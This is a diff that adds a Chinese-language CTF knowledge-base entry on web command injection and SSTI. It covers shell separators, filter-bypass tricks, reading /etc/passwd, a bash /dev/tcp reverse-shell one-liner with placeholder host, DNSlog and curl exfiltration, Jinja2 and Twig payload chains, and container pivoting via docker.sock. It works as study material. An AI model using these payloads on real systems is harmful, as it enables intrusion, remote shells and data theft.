@@ -1,0 +1,18 @@
+{
+ "name": "Web-命令执行与SSTI",
+ "title": "Web-命令执行与SSTI",
+ "summary": "目标都是\"让服务器执行我们想执行的东西\"。区别在于：命令执行是直接在 shell 里跑，SSTI 是借模板引擎的手跑。",
+ "content": "# Web-命令执行与SSTI\n\n> 目标都是\"让服务器执行我们想执行的东西\"。区别在于：命令执行是直接在 shell 里跑，SSTI 是借模板引擎的手跑。\n\n## 一、命令执行（RCE）\n\n### 1. 判断标志\n参数名本身就是信号：`?cmd=`、`?exec=`、`?ping=`、`?ip=`、`?host=`、`?shell=`。\n先传一个**会产生差异**的输入：`ls`、`whoami`、`id`（Linux）或 `dir`、`whoami`（Windows），看回显。\n\n### 2. 连接符速查（Linux）\n\n| 写法 | 含义 |\n|---|---|\n| `;` | 顺序执行，前一条失败也继续 |\n| `&&` | 前一条成功才执行 |\n| `\\|` | 管道，前者输出给后者 |\n| `\\|\\|` | 前一条失败才执行 |\n| `$()` / 反引号 | 命令替换，无空格场景好用 |\n| `%0a` | 换行，等于新起一条命令 |\n\nWindows：`&`、`&&`、`|`、`||`、`%0a`。\n\n### 3. 空格与关键词被过滤\n\n- 空格：`$IFS`、`${IFS}`、`%09`(Tab)、`<`、`{cat,/etc/passwd}`（大括号展开）\n- 关键词（cat/flag 被拦）：\n  - 通配：`cat /f*`、`/???/???/passwd`\n  - 拼接：`a=c;b=at;$a$b /flag`\n  - 变量替换：`${PATH:0:1}` 取 `/`\n  - 编码：`$(printf '\\x63\\x61\\x74')`\n  - 借用：`tac`、`head`、`more`、`nl`、`od`、`sort`、`rev`、`base64`（读文件有一堆替代品）\n- 无回显（blind）：`bash -c 'cmd > /tmp/o'` 写到 web 目录再访问；或 `ping` 带数据出网（DNSlog）；或 `curl` 打回来\n\n### 4. 反弹 shell 与提权方向\n- 反弹：`bash -i >& /dev/tcp/IP/PORT 0>&1`、`nc -e`、Python/Perl/PHP 一行版（靶机常不出网，则改用写文件 + 访问）\n- 拿到命令执行后：找 flag（`find / -name '*flag*'`、`grep -r flag /`）、看环境变量、看 `/proc/1/cmdline` 了解容器、找 hub/docker.sock、找内部服务凭据 → [[Docker-Registry与远程API利用]]\n\n## 二、SSTI 模板注入\n\n### 1. 判断：先找\"引擎特征\"\n传 `{{7*7}}`：\n- 回显 `49` → 有模板求值，进入下一步\n- 回显原样 `{{7*7}}` → 不是模板，或该处不执行\n\n再看 `{{7*'7'}}`：`7777777` = **Jinja2**(Python)；`49` = **Twig**(PHP)。这类\"身份证测试\"能直接定引擎。\n\n### 2. 按引擎分头走\n\n| 引擎 | 语言 | 常见利用入口 |\n|---|---|---|\n| Jinja2 | Python/Flask | `{{ ''.__class__.__mro__[1].__subclasses__() }}` 爬到 `os`/`subprocess` |\n| Twig | PHP | `{{_self.env.registerUndefinedFilterCallback(\"exec\")}}` 类 |\n| Smarty | PHP | `{php}` / `{system()` 变体 |\n| Freemarker / Velocity | Java | `?new()` / `Runtime.getRuntime()` 类 |\n| ERB / Thymeleaf | Ruby / Java | `<%= %>` / `T(java.lang.Runtime)` |\n\nJinja2 的通用爬链思路：**从任意对象往上爬到基类 `object` → 找所有子类 → 在子类里找到 `os` 或 `subprocess.Popen` 或 `warnings.catch_warnings` → 调它执行命令**。\n被过滤时的绕过：`request.args`、`|attr()` 过滤点、`\\x5f` 代替下划线、`{%print%}`、字符串拼接 `'os'`。\n\n### 3. 其他入口\n- 回显不给结果 → 盲 SSTI（时间盲 `sleep`，或把结果写到 cookie/响应头）\n- 带沙箱的（Sandboxed / Flask-Jinja2 的 `SecurityError`）→ 属于更深的题，先确认过滤器黑名单再说\n\n## 三、两者共同的收尾习惯\n\n1. **先确认\"能执行\"再想\"执行什么\"** —— `id` / `whoami` 是探针\n2. **flag 常常不在当前目录** —— 学会 `find` / `grep -r`（注意别把 shell 卡死）\n3. **容器内要横着看** —— 环境变量、`/proc`、内网服务、挂载的 docker.sock\n\n## 关联\n\n- [[Web-文件包含与上传]] —— 拿到代码执行的常见前一步\n- [[Web-反序列化漏洞]] —— 同样以\"执行任意代码\"为目标\n- [[Docker-Registry与远程API利用]] —— 命令执行后的横向\n- [[Pwn-栈溢出与ROP]] —— 同样目标，不同层次（这里打的是应用层，那里打的是内存）\n- [[CTF-常用工具清单]]\n\n## 存疑 / 矛盾\n\n- `{{7*7}}` 返回 49 **不等于**可以执行命令：只说明模板求值生效，沙箱/白名单可能仍在。要按引擎具体格式再验证一层。\n- \"关键词过滤就用编码绕过\"不是万能：部分框架在求值前会先做一次规范化，编码会被还原。**先用回显确认过滤器到底拦了什么**。\n\n## 来源\n\n- 糯米内建知识整理 · 2026-10-03（无外部文件）\n",
+ "section": "concept",
+ "group": "web",
+ "links": {
+  "internal": [
+   "CTF-常用工具清单",
+   "Docker-Registry与远程API利用",
+   "Pwn-栈溢出与ROP",
+   "Web-反序列化漏洞",
+   "Web-文件包含与上传"
+  ],
+  "unresolved": []
+ }
+}
